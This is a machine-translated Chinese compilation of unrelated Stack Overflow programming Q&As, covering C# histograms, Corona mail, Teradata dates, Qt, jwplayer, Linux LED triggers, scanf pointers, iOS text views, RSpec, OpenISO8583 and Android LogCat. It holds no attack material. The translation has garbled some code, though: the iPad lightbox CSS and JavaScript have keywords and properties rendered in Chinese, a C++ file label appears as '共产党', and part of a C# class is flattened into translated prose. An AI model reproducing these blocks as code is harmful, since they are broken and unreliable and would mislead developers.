## 回答 #3

> 赞同：0
> 
> 时间：2014-01-17T13:40:28.777

这是我的做法，我知道这是一个旧线程，但它会帮助其他正在寻找答案的人：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Imaging;
using WeifenLuo.WinFormsUI.Docking;

namespace ImageFunctions.Forms
{
    public partial class FrmHistogram : DockContent
    {
        public delegate void HistogramStatus(string Message);
        public event HistogramStatus histogramStatus;
        public delegate void HistogramCompleted(string Message);
        public event HistogramCompleted histogramCompleted;

        private Stopwatch swHistogram = new Stopwatch();
        private bool IsHorizontalIntensity { get; set; }
        private string CurrentImage = null;
        private System.Windows.Forms.DataVisualization.Charting.Chart chart = new System.Windows.Forms.DataVisualization.Charting.Chart();

        public FrmHistogram()
        {
            InitializeComponent();
            chart.Dock = DockStyle.Fill;
            chart.BackColor = Color.LightYellow;
            chart.ChartAreas.Add("Default");
            this.Controls.Add(chart);
            IsHorizontalIntensity = true; // Default.
        }

        protected override string GetPersistString()
        {
            return this.Text;

        }

        #region Histogram

        /// <summary>
        /// Build the Histogram for Supplied Image
        /// </summary>
        /// <param name="image">
        /// String: Path to image that histogram is to be created out of
        /// </param>
        public void DoHistogram(string image)
        {
            CurrentImage = image; // Used for re-generating the histogram
            bool IsGrayScale = AForge.Imaging.Image.IsGrayscale(new Bitmap(image));
            dynamic IntensityStatistics = null; // Use dynamic (a little like var) to assign this variable which maybe of different types.

            swHistogram.Reset();
            swHistogram.Start();
            histogramStatus("Creating Histogram");

            AForge.Math.Histogram grayhist;
            AForge.Math.Histogram Redhist;
            AForge.Math.Histogram Greenhist;
            AForge.Math.Histogram Bluehist;
            // collect statistics
            //NOTE: We have to use the braces on these statements see: http://stackoverflow.com/questions/2496589/variable-declarations-following-if-statements
            if (IsHorizontalIntensity)
            {
                histogramStatus("Using HorizontalIntensityStatistics");
                IntensityStatistics = new HorizontalIntensityStatistics(new Bitmap(image));
            }
            else
            {
                histogramStatus("Using VerticalIntensityStatistics");
                IntensityStatistics = new VerticalIntensityStatistics(new Bitmap(image));
            }

            // get gray histogram (for grayscale image)
            if (IsGrayScale)
            {
                grayhist = IntensityStatistics.Gray;
                //TODO: DoGrayHistogram();
                histogramStatus("Grayscale Histogram");
            }
            else
            {

                Redhist = IntensityStatistics.Red;
                Greenhist = IntensityStatistics.Green;
                Bluehist = IntensityStatistics.Blue;
                DoRGBHistogram(Redhist, Greenhist, Bluehist);
                histogramStatus("RGB Histogram");
            }

            swHistogram.Stop();
            histogramCompleted("Histogram built in " + swHistogram.Elapsed);

        }

        private void DoRGBHistogram(AForge.Math.Histogram RedHist, AForge.Math.Histogram GreenHist, AForge.Math.Histogram BlueHist)
        {

            // Decide which set of values are placed at back, in the middle and to the front of the graph.
            List<double> lis = new List<double>();
            lis.Add(RedHist.Mean);
            lis.Add(GreenHist.Mean);
            lis.Add(BlueHist.Mean);
            lis.Sort();

            try
            {
                chart.Series.Add("Red");
                chart.Series.Add("Green");
                chart.Series.Add("Blue");

                // Set SplineArea chart type
                chart.Series["Red"].ChartType = System.Windows.Forms.DataVisualization.Charting.SeriesChartType.SplineArea;
                chart.Series["Green"].ChartType = System.Windows.Forms.DataVisualization.Charting.SeriesChartType.SplineArea;
                chart.Series["Blue"].ChartType = System.Windows.Forms.DataVisualization.Charting.SeriesChartType.SplineArea;
                // set line tension
                chart.Series["Red"]["LineTension"] = "0.8";
                chart.Series["Green"]["LineTension"] = "0.8";
                chart.Series["Blue"]["LineTension"] = "0.8";
                // Set colour and transparency
                chart.Series["Red"].Color = Color.FromArgb(50, Color.Red);
                chart.Series["Green"].Color = Color.FromArgb(50, Color.Green);
                chart.Series["Blue"].Color = Color.FromArgb(50, Color.Blue);
                // Disable X & Y axis labels
                chart.ChartAreas["Default"].AxisX.LabelStyle.Enabled = false;
                chart.ChartAreas["Default"].AxisY.LabelStyle.Enabled = false;
                chart.ChartAreas["Default"].AxisX.MinorGrid.Enabled = false;
                chart.ChartAreas["Default"].AxisX.MajorGrid.Enabled = false;
                chart.ChartAreas["Default"].AxisY.MinorGrid.Enabled = false;
                chart.ChartAreas["Default"].AxisY.MajorGrid.Enabled = false;
            }
            catch (Exception)
            {
                // Throws an exception if it is already created.
            }
            chart.Series["Red"].Points.Clear();
            chart.Series["Green"].Points.Clear();
            chart.Series["Blue"].Points.Clear();

            foreach (double value in RedHist.Values)
            {
                chart.Series["Red"].Points.AddY(value);
            }
            foreach (double value in GreenHist.Values)
            {
                chart.Series["Green"].Points.AddY(value);
            }
            foreach (double value in BlueHist.Values)
            {
                chart.Series["Blue"].Points.AddY(value);
            }

        }

        #endregion

        /// <summary>
        /// If the Horizontal Intensity is checked then set the IsHorizontalIntensity to true
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void horizontalIntensityMenuItem_Click(object sender, EventArgs e)
        {
            ToggleMenu();
            if (horizontalIntensityMenuItem.Checked) IsHorizontalIntensity = true;
            DoHistogram(CurrentImage);
        }

        /// <summary>
        /// The two options Horizontal & Vertical are Mutually exclusive this make sure that both options are not checked at the same time
        /// One is checked as default - the other is not, so they will swap around.
        /// </summary>
        private void ToggleMenu()
        {
            horizontalIntensityMenuItem.Checked = !horizontalIntensityMenuItem.Checked; // Toggle this
            verticalIntensityMenuItem.Checked = !verticalIntensityMenuItem.Checked; // Toggle this
        }

        /// <summary>
        /// If the Horizontal Intensity is checked then set the IsHorizontalIntensity to False
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void verticalIntensityMenuItem_Click(object sender, EventArgs e)
        {
            ToggleMenu();
            if (horizontalIntensityMenuItem.Checked) IsHorizontalIntensity = false;
            DoHistogram(CurrentImage);
        }

    }
} 
```

DoHistogram() 获取直方图值 DoRGBHistogram() 实际上将 RGB 值复制到表单上的图表中。您将从本系列或文章中获得更多信息：http: [//code.msdn.microsoft.com/Professional-Image-35101193](http://code.msdn.microsoft.com/Professional-Image-35101193)

# lua - 使用 Corona 发送邮件

> ID：10597553
> 
> 赞同：1
> 
> 时间：2012-05-15T09:12:18.723
> 
> 标签：lua, coronasdk

在行中：

```
local mail1 = native.showPopup("mail") 
```

我收到：运行时错误：/Users/liorbruder/Documents/main.lua:18：尝试调用字段“showPopup”（零值）。看起来 Native UI 没有“showPopup”属性。我在这里想念什么？以及如何使用 Corona 发送电子邮件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T23:34:10.470

showPopup 仅在 build 714 中可用。

对于以前版本的 Corona，您可以使用

```
local link = "mailto:nobody@mycompany.com?subject=Hi%20there&body=I%20just%20wanted%20to%20say%2C%20Hi!"
system.openURL(link) 
```

有关更多详细信息，请参见此处。 [http://developer.anscamobile.com/reference/index/systemopenurl](http://developer.anscamobile.com/reference/index/systemopenurl)

# android - 如果第一次下载应用程序，则注册来自第二次登录

> ID：10597568
> 
> 赞同：-4
> 
> 时间：2012-05-15T09:12:56.333
> 
> 标签：android

我正在开发一个应用程序。要求如下： 如果应用程序是第一次下载并打开 1) 出现注册屏幕。2）如果用户已经注册，那么他可以跳过这一步3）并进入登录屏幕。从第二次开始，只出现登录屏幕。4) 如果第一次下载并打开应用程序，会出现注册/登录屏幕。如果用户已经注册，他可以简单地登录。从第二次开始，直接到主页，无需登录。我对此一无所知。有人可以在这方面帮助我吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:15:05.587

您需要学习如何使用`PreferenceManager`，请尝试在此处阅读有关在您的 android 应用程序中存储数据的信息：[使数据在 android 中持久化](https://stackoverflow.com/questions/3310066/making-data-persistent-in-android)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T10:18:30.090

我建议使用 SharedPreferences 来做到这一点。

# hibernate - 使用 Hibernate 的 Teradata DB 日期插入错误

> ID：10597570
> 
> 赞同：0
> 
> 时间：2012-05-15T09:12:59.470
> 
> 标签：hibernate, date, insert, teradata

我们正在使用 Hibernate 将数据从我们的 JAVA 应用程序插入到 Teradata 数据库。现在，表中有一个日期列，所以我们只需将新的 Data() 传递进去并尝试保存它。但它给了我们以下错误：

```
Caused by: com.teradata.jdbc.jdbc_4.util.JDBCException: [Teradata Database] [TeraJDBC 14.00.00.13] [Error 5404] [SQLState HY000] Datetime field overflow.
    at com.teradata.jdbc.jdbc_4.util.ErrorFactory.makeDatabaseSQLException(ErrorFactory.java:307)
    at com.teradata.jdbc.jdbc_4.statemachine.ReceiveInitSubState.action(ReceiveInitSubState.java:102)
    at com.teradata.jdbc.jdbc_4.statemachine.StatementReceiveState.subStateMachine(StatementReceiveState.java:302) 
```

以供参考：

我的实体班：

```
@Temporal(TemporalType.TIMESTAMP)
    @Column(name = "EDW_CREATE_DTM")    
    public Date getEdwCreateDtm() {
        return edwCreateDtm;
    } 
```

在我的服务类中......在插入之前设置值：

```
someObject.setEdwCreateDtm(new Date()); 
```

有没有将日期插入到 teradata 的特定方法？

对此的任何指示都会有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T20:31:45.567

您的目标列是否定义为 TIMESTAMP 或 DATE？

如果将其定义为 TIMESTAMP，您是否尝试插入大于 TIMESTAMP 数据类型精度的时间精度？例如，如果列定义为 TIMESTAMP(0)，并且您尝试插入“2012-05-15 14:25:46.125”，则可能会收到溢出错误。您的列需要定义为 TIMESTAMP(3)。

如果将其定义为 DATE，则不支持 TIMESTAMP 的 TIME 部分。Teradata 中的 DATE 数据类型是“yyyy-mm-dd”或可比较的值。

# c++ - 在 Qt Symbian C++ 中省略 QPushButton 的文本

> ID：10597572
> 
> 赞同：1
> 
> 时间：2012-05-15T09:13:04.553
> 
> 标签：c++, qt, symbian

如何省略 a 的文本`QPushButton`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2019-01-23T15:08:51.680

基于省略标签的 Qt 示例，我提出了以下解决方案。它主要基于Qt示例，我只是根据我的要求对其进行了简化：

标题：

```
/**
 * Push button with elided text
 * \remark based on http://doc.qt.io/qt-5/qtwidgets-widgets-elidedlabel-example.html
 */
class CElidedPushButton : public QPushButton
{
    Q_OBJECT
    Q_PROPERTY(QString text READ text WRITE setText)
    Q_PROPERTY(bool isElided READ isElided)

public:
    //! Constructor
    explicit CElidedPushButton(QWidget *parent = nullptr);

    //! Constructor
    explicit CElidedPushButton(const QString &text, QWidget *parent = nullptr);

    //! Text
    void setText(const QString &text);

    //! Text
    const QString &text() const { return m_content; }

    //! Elided?
    bool isElided() const { return m_elided; }

protected:
    //! \copydoc QPushButton::paintEvent
    void paintEvent(QPaintEvent *event) override;

private:
    bool m_elided = false;
    QString m_content;
}; 
```

共产党：

```
CElidedPushButton::CElidedPushButton(QWidget *parent) : QPushButton(parent)
{ }

CElidedPushButton::CElidedPushButton(const QString &text, QWidget *parent)
    : QPushButton(parent), m_elided(false), m_content(text)
{
    this->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
}

void CElidedPushButton::setText(const QString &newText)
{
    m_content = newText;
    this->update();
}

void CElidedPushButton::paintEvent(QPaintEvent *event)
{
    QPainter painter(this);
    const QFontMetrics fontMetrics = painter.fontMetrics();
    const int usableWidth = qRound(0.9 * this->width());

    const QString elidedText = fontMetrics.elidedText(m_content, Qt::ElideRight, usableWidth);
    m_elided = (elidedText != m_content);
    QPushButton::setText(elidedText);
    QPushButton::paintEvent(event);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:03:04.117

如果您的意思是添加省略号。下次谷歌更好： [ElidedButton 类参考](http://opticks.org/docs/sdk/4.8.0/d2/d7e/classElidedButton.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-15T09:26:00.300

```
YourPushButton->setText(""); 
```

# jquery - jQuery FullCalendar 示例插入/删除事件

> ID：10597578
> 
> 赞同：-3
> 
> 时间：2012-05-15T09:13:20.043
> 
> 标签：jquery, fullcalendar

有人有从日历和 json 数据读取/写入事件的示例吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-17T09:18:24.733

所有内容都在项目的主页上有很好的记录，你也可以在那里找到你的任务的运行演示

*   [http://arshaw.com/js/fullcalendar-1.5.3/demos/json.html](http://arshaw.com/js/fullcalendar-1.5.3/demos/json.html)

# java - 以 pdf 格式导出标签

> ID：10597587
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:13:50.163
> 
> 标签：java, pdf-generation, itext, apache-poi

我正在管理一个 java web 应用程序，我想制作一个 pdf 导出，其中包含一些带有徽标的标签和一些数据，如“id”。最好的方法是什么。我在想像 iText 之类的东西（我不仅对 html 到 pdf 转换器感兴趣），但我不确定我是否可以在我的票中包含图像和边框。欢迎每个建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T11:47:24.447

如果您想要从头开始创建包含图像和文本的 PDF 文件，那么是的，iText 可以做到这一点（以及更多）。如果有更详细的答案，请使用有关您的要求的更多详细信息编辑您的问题。

# iphone - applicationDidEnterBackground：没有被调用

> ID：10597592
> 
> 赞同：0
> 
> 时间：2012-05-15T09:14:09.843
> 
> 标签：iphone, objective-c, background-process, video-editing

我正在为 iPhone 创建一个视频编辑应用程序。

当用户设置视频编辑然后开始渲染时，显然需要时间。当用户按下主页按钮时，应用程序被最小化，但渲染仍然继续并且`applicationDidEnterBackground:`不会被调用，除非渲染过程完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:21:11.770

您可以发布执行渲染的代码吗？

如果这是一个阻塞调用，需要花费大量时间才能完成，并且您正在主运行循环中执行此操作，那么您正在阻塞运行循环。你的渲染代码需要在`applicationDidEnterBackground`被调用之前完成，如果这需要太长时间，iOS 会简单地杀死你的应用程序。IT 还会冻结 UI，这是您绝对不想要的。

最可能的解决方案是将渲染代码移动到后台线程，但这实际上取决于您在做什么。

# javascript - 使用 jwplayer 获取当前播放时间

> ID：10597600
> 
> 赞同：4
> 
> 时间：2012-05-15T09:14:30.967
> 
> 标签：javascript, jwplayer

我正在使用[jwplayer](http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/15990/about-the-jw-player)播放嵌入式视频，[javascript api](http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/16023/getting-values-from-the-player)告诉我

`jwplayer("mediaplayer").getPosition()`

将获得当前位置，但我的结果是`undefined`

谁能帮我得到正确的结果

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:24:47.300

[对我来说很好，](http://jsfiddle.net/AMXvU/)只是文档指定的方式：

```
<div id="container"></div>

jwplayer("container").setup({
    file: "http://content.bitsontherun.com/videos/nPripu9l-60830.mp4",
    flashplayer: "http://player.longtailvideo.com/player.swf",
    image: "http://content.bitsontherun.com/thumbs/nPripu9l-480.jpg",
    height: 270,
    width: 480
});
var state = jwplayer("container").getState();
var elapsed = jwplayer("container").getPosition(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:24:34.500

您的 HTML 和 JavaScript 看起来如何？没有看到这些，我只能假设以下内容。

根据网站上的[API 文档](http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/12540/javascript-api-reference#GettingStarted)，这可以在不指定容器的情况下实现，就像这样......

```
jwplayer().getPosition() 
```

# linux - 如何更改 LED 触发器？

> ID：10597602
> 
> 赞同：4
> 
> 时间：2012-05-15T09:14:31.603
> 
> 标签：linux, kernel, linux-device-driver, led

我已经在 BSP 的 LED 中注册：

```
static struct gpio_led ic_leds[] = {
        {
                .name                   = "led1:green",
                .gpio                   = USER_LED,
                .default_trigger        = "heartbeat",
                .active_low             = 1,
        },
};

static struct gpio_led_platform_data ic_led_info = {
        .num_leds       = ARRAY_SIZE(ic_leds),
        .leds           = ic_leds,
};

static struct platform_device ic_leds_device = {
        .name   = "leds-gpio",
        .id     = -1,
        .dev    = {
                .platform_data = &ic_led_info,
        },
};

static void __init ic_add_device_leds(void)
{
        platform_device_register(&ic_leds_device);
} 
```

如何在运行时更改触发器？我知道 sysfs 是可能的，但可能以另一种方式存在？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2018-09-26T21:11:47.503

```
echo "thetriggeryouwant" > /sys/class/leds/someled/trigger 
```

`thetriggeryouwant`例如`phy0rx`，哪里是`someled`您要更改触发器的 LED 的名称。

* * *

要获取该 LED 的所有可用触发器，您可以`cat`使用以下文件：

```
cat /sys/class/leds/someled/trigger 
```

例如：

> `[none] timer oneshot mtd nand-disk heartbeat backlight gpio cpu cpu0 cpu1 activity default-on 2188000.ethernet-2:00:link 2188000.ethernet-2:00:100Mbps 2188000.ethernet-2:00:10Mbps`

其中括号 ( `[none]`) 中的项目表示当前触发器。

# c - 为什么scanf需要&？

> ID：10597606
> 
> 赞同：22
> 
> 时间：2012-05-15T09:14:49.060
> 
> 标签：c, scanf

我想从标准输入读取一个数字。我不明白为什么`scanf`需要在`&`我的变量名称之前使用：

```
int i;
scanf("%d", &i); 
```

为什么`scanf`需要变量的地址？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-05-15T09:16:17.690

它需要改变变量。由于 C 中的所有参数都是*按值*传递的，因此如果您希望函数能够更改参数，则需要传递一个指针。

这是一个显示它的超级简单示例：

```
void nochange(int var) {
    // Here, var is a copy of the original number. &var != &value
    var = 1337;
}
void change(int *var) {
    // Here, var is a pointer to the original number. var == &value
    // Writing to `*var` modifies the variable the pointer points to
    *var = 1337;
}
int main() {
    int value = 42;
    nochange(value);
    change(&value);
    return 0;
} 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-05-15T09:18:03.600

C 函数参数*始终*是“按值传递”，这意味着该函数`scanf`只能看到您指定为参数表达式的任何当前值的副本。

在这种情况下`&i`，是一个指向变量的指针值`i`。`scanf`可以用这个来修改`i`。如果你通过了`i`，那么它只会看到一个未初始化的值，(a) 是 UB，(b) 信息不足以`scanf`知道如何修改`i`。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-05-15T13:39:28.110

这不是必需的。

```
char s[1234];

scanf("%s", s); 
```

工作得很好，没有`&`任何地方。什么`scanf`和公司需要的是*指针*。要让它修改特定变量，您需要传递该变量的地址。对于默认情况下发生的几种类型。对于其他人，您使用`&`获取地址（获取指向该变量的指针）。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-15T09:16:20.437

因为否则它只会更改副本而不是原件。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-15T09:17:49.313

scanf 需要 addressOf 运算符 (&)，因为它将指针作为参数。因此，为了传入要设置为传入值的变量，您必须从变量中创建一个指针，以便可以更改它。

必须将指针传递给scanf 的原因是，如果您只是传递一个变量，您将无法直接更改scanf 中的变量，因此您无法将其设置为scanf 读取的值。

希望这可以帮助。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-05-15T09:19:36.130

`scanf()`存储值，所以它需要一个地方来存储它们。
这是通过使用`addressof`或 &(&(&) 运算符提供存储值的地址（在指针中）来完成的。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-15T09:22:14.900

sscanf 不需要 &

```
int decimal;
int *pointer = &decimal;
scanf("%d", pointer); 
```

以上代码有效

# ios - 自动扩展 UITextView 高度以包含动态加载的完整文本

> ID：10597610
> 
> 赞同：2
> 
> 时间：2012-05-15T09:15:00.840
> 
> 标签：ios, uitextview

我有一个简单的 textView，它的数据是动态填充的。一旦填充了数据，我想调整 textview 的高度，这样我就看不到垂直滚动，也看不到文本被剪裁。

可以简单地通过选择其中一种 textView 模式来完成，还是我需要通过编程来完成？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T09:25:09.457

您可以通过将这几行代码添加到您的应用程序来做到这一点：-

```
CGRect frame = textView.frame; 
frame.size.height = textView.contentSize.height; 
textView.frame = frame; 
```

在 textview 的委托方法中实现此代码

```
- (void)textViewDidChange:(UITextView *)textView 
{
// you might have to compare the frames if it needs changing as user might not have added an extra line
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:22:48.347

您必须以编程方式进行。使用[NSString UIKit Additions](http://developer.apple.com/library/ios/#documentation/uikit/reference/NSString_UIKit_Additions/Reference/Reference.html)计算 UITextView 的高度：

```
sizeWithFont:
sizeWithFont:constrainedToSize:
sizeWithFont:constrainedToSize:lineBreakMode:
sizeWithFont:forWidth:lineBreakMode:
sizeWithFont:minFontSize:actualFontSize:forWidth:lineBreakMode: 
```

# ruby-on-rails - 轨道上的所有固定装置

> ID：10597620
> 
> 赞同：1
> 
> 时间：2012-05-15T09:15:32.897
> 
> 标签：ruby-on-rails, rspec2, fixtures, rspec-rails

我想我遗漏了一些非常明显的东西，但是在我的 RSpec 测试中，我想做这样的事情：

```
it "should assign all channels to @channels" do                                                                                                                                                                      
  get :index                                                                                                                                                                                         
  assigns(:channels).should eq(channels(:all))                                                                                                                                                       
end 
```

正如你所看到的，我想要一个数组中的所有通道用于我的测试，所以当我将来添加一个新的夹具时我不必修复我的所有测试。

`channels(:all)`不起作用`channels.kind_of? Array`，默认情况下为 true 且为空。

有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:17:52.557

您可能需要的是：

```
assigns(:channels).should eq(Channel.all) 
```

# openiso8583.net - OpenISO8583.Net BCD 修复格式解包错误

> ID：10597621
> 
> 赞同：0
> 
> 时间：2012-05-15T09:15:46.443
> 
> 标签：openiso8583.net

我从code.google下载了代码并得到了最新版本v0.5.2
我设置了一个bcd fix格式的字段，即bcd格式的N-6（bit._003_proc_code）
例如：
*字段定义：<br/> DefaultTemplate =新模板 { { Bit._002_PAN, FieldDescriptor.BcdVar(2, 19,Formatters.Ascii) }, { Bit._003_PROC_CODE, FieldDescriptor.BcdFixed(3)}, { Bit._004_TRAN_AMOUNT, FieldDescriptor.BcdFixed(6) }, . ...... }

用法：

```
Iso8583 msg =new Iso8584();
msg[3]="000000"; 
```

当我解包消息时，我只能从消息 3 中得到“0000”。
这是定义中的错误还是错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T04:53:52.867

我会等着听 John Oxley 的消息，看看这是否只是一个编码错误。既然我这么说，我认为这是一个错误。

我遇到了 BcdFixed 定义的问题，最终创建了一个新的 Fixed Length BCD 格式化程序来解决这个问题。

这是我所做的：

1.  我创建了一个名为 FixedLengthBcdFormatter 的类，它是 FixedLengthFormatter 类的变体。

    /// /// 固定字段格式化程序 /// public class FixedLengthBcdFormatter : ILengthFormatter { private readonly int _packedLength; 私有只读 int _unPackedLength;

    ```
    ///<summary>
    ///  Fixed length field formatter
    ///</summary>
    ///<param name = "unPackedLength">The unpacked length of the field.</param>
    public FixedLengthBcdFormatter(int unPackedLength)
    {
        _unPackedLength = unPackedLength;
        double len = _unPackedLength;
       _packedLength =  (int)Math.Ceiling(len / 2);
    }

    #region ILengthFormatter Members

    /// <summary>
    ///   Get the length of the packed length indicator.  For fixed length fields this is 0
    /// </summary>
    public int LengthOfLengthIndicator
    {
        get { return 0; }
    }

    /// <summary>
    ///   The maximum length of the field displayed as a string for descriptors
    /// </summary>
    public string MaxLength
    {
        get { return _unPackedLength.ToString(); }
    }

    /// <summary>
    ///   Descriptor for the length formatter used in ToString methods
    /// </summary>
    public string Description
    {
        get { return "FixedBcd"; }
    }

    /// <summary>
    ///   Get the length of the field
    /// </summary>
    /// <param name = "msg">Byte array of message data</param>
    /// <param name = "offset">offset to start parsing</param>
    /// <returns>The length of the field</returns>
    public int GetLengthOfField(byte[] msg, int offset)
    {
        return _unPackedLength;
    }

    /// <summary>
    ///   Pack the length header into the message
    /// </summary>
    /// <param name = "msg">Byte array of the message</param>
    /// <param name = "length">The length to pack into the message</param>
    /// <param name = "offset">Offset to start the packing</param>
    /// <returns>offset for the start of the field</returns>
    public int Pack(byte[] msg, int length, int offset)
    {
        return offset;
    }

    /// <summary>
    ///   Check the length of the field is valid
    /// </summary>
    /// <param name = "packedLength">the packed length of the field</param>
    /// <returns>true if valid, false otherwise</returns>
    public bool IsValidLength(int packedLength)
    {
        return packedLength == _packedLength;
    }

    #endregion 
    ```

    }

2.  修改了 FieldDescription 类/BcdFixed 声明

    /// /// bcd 已修复。/// /// /// 长度。/// /// /// public static IFieldDescriptor BcdFixed(int unpackedLength) { return Create(new FixedLengthBcdFormatter(unpackedLength), FieldValidators.N, Formatters.Bcd, null); }

3.  然后更改您的格式化程序声明以提供解包长度作为参数。

    Bit._003_PROC_CODE, FieldDescriptor.BcdFixed(6)},

同样，所有这些可能都是不必要的，因为我对现有代码一无所知，但它对我有用。

我希望这有帮助。

# jquery - 在 iPad 视口中保持 jQuery 模态

> ID：10597622
> 
> 赞同：1
> 
> 时间：2012-05-15T09:15:54.920
> 
> 标签：jquery, css, ipad

我写了一个相当简单的 jQuery 模态，因为我不想让任何东西变得沉重。除 iPad 外，该模式在所有浏览器上都能正常工作。

如果我在页面底部并单击以打开灯箱，它将在页面顶部打开而看不见。

我没有使用 jQuery 来定位窗口只是纯 css 任何人都可以看到为什么这会在 iPad 之外的所有其他浏览器中工作？

```
＃灯箱 {
    位置：固定；/* 将灯箱窗口保持在当前视口中 */
    顶部：0；
    左：0；
    宽度：100%；
    高度：100%；
    z指数：2；
    背景色：rgba(0, 0, 0, 0.2);
    字体粗细：100；
    边距：0 0 .1em 0；
    颜色：#f8ef71；
    文字阴影：1px 1px 1px #af7913;
    文本对齐：居中；
}

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:26:04.927

position:fixed 不是普遍支持的，我猜你的iOS版本低于5，这是第一个支持它的iOS版本？此模式也不会在 IE6 和 7 上。如果没有，它也不会在 Android 2.3 及更少版本中*运行*如果不通过视口元标记禁用缩放，

您将面临的另一个困难 position:fixed 是它相对于窗口，而不是视口，因此在缩放元素时不会出现您想要的样子。这就是为什么他们在没有禁用缩放的情况下禁用了 android 2.3 中的固定（或者我相信），尽管他们在以后的 android 版本中改变了这个位置。

这是一个相关的问题： [CSS“位置：固定；” 在 iPad/iPhone 上？](https://stackoverflow.com/questions/4889601/css-position-fixed-into-ipad-iphone)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T10:17:32.523

感谢 Ed Kirk 提醒我 iOS pre version 5 中的位置固定问题

我写了一个小JS来解决我的问题

```
如果（navigator.platform == 'iPad' || navigator.platform == 'iPhone' || navigator.platform == 'iPod'）
        {
            变量 cssObj = {
                '背景色' : 'rgba(0, 0, 0, 0)',
                “位置”：“绝对”，
                'top' : $(document).scrollTop()
            };

            $('#lightbox').css(cssObj);
            $(window).scroll(function() {$('#lightbox').animate({top: $(document).scrollTop()}, 300);});
        };

```

# android - 如何在 LogCat 中插入一个日志，当我单击它时会跳转到它的代码行？

> ID：10597623
> 
> 赞同：15
> 
> 时间：2012-05-15T09:15:54.490
> 
> 标签：android, eclipse, logcat

我想在 LogCat 中插入一个日志，当我单击它时会跳转到它的行，就像系统生成的一些错误日志一样。

是否可以？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-15T10:57:22.083

我找到了：

```
public static void showLogCat(String tag, String msg) {

        StackTraceElement[] stackTraceElement = Thread.currentThread()
                .getStackTrace();
        int currentIndex = -1;
        for (int i = 0; i < stackTraceElement.length; i++) {
            if (stackTraceElement[i].getMethodName().compareTo("showLogCat") == 0)
            {
                currentIndex = i + 1;
                break;
            }
        }

        String fullClassName = stackTraceElement[currentIndex].getClassName();
        String className = fullClassName.substring(fullClassName
                .lastIndexOf(".") + 1);
        String methodName = stackTraceElement[currentIndex].getMethodName();
        String lineNumber = String
                .valueOf(stackTraceElement[currentIndex].getLineNumber());

        Log.i(tag, msg);
        Log.i(tag + " position", "at " + fullClassName + "." + methodName + "("
                + className + ".java:" + lineNumber + ")");

    } 
```

它的用法：

```
showLogCat("tag", "message"); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-12-30T11:09:13.543

**`"(X:Y)"`重要的是在您的日志消息中插入`X`您想要的*文件名*，并且`Y`是您想要的*行*号`X`。** *（我从[@breceivemail 的回答](https://stackoverflow.com/a/10599298/5318303)中了解到）*。所以试试：

```
public static void log(final String tag, final String msg) {
    final StackTraceElement stackTrace = new Exception().getStackTrace()[1];

    String fileName = stackTrace.getFileName();
    if (fileName == null) fileName="";  // It is necessary if you want to use proguard obfuscation.

    final String info = stackTrace.getMethodName() + " (" + fileName + ":"
            + stackTrace.getLineNumber() + ")";

    Log.LEVEL(tag, info + ": " + msg);
} 
```

**注意**：是日志级别，`LEVEL`可以是`v`、`d`、`i`、或。`w``e``wtf`

现在您可以使用`log(tag, msg)`而不是`Log.LEVEL(tag, msg)`.

* * *

例子：

**MainActivity.java**：

```
...
public class MainActivity extends BaseActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        log("Test Tag", "Hello World!");

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ...
    ... 
```

输出：

```
12-30 14:24:45.343 ? I/Test Tag: onCreate (MainActivity.java:10): Hello World! 
```

并`MainActivity.java:10`自动成为一个[链接](https://stackoverflow.com/questions/10597623/how-to-insert-a-log-in-logcat-that-when-i-click-on-it-jumps-to-its-line-in-code#answer-41395273)，您可以点击它！

* * *

`info`如果您想要更详细的日志，还可以将以下值分配给变量：

```
final String info = stackTrace.getClassName() + "." + stackTrace.getMethodName() + " ("
            + fileName + ":" + stackTrace.getLineNumber() + ")\n"; 
```

所以上面例子的输出是：

```
12-30 14:33:07.360 ? I/Test Tag: com.example.myapp.MainActivity.onCreate (MainActivity.java:11)
                                 Hello World! 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-04-17T07:29:18.403

请将此树与木材一起使用。

```
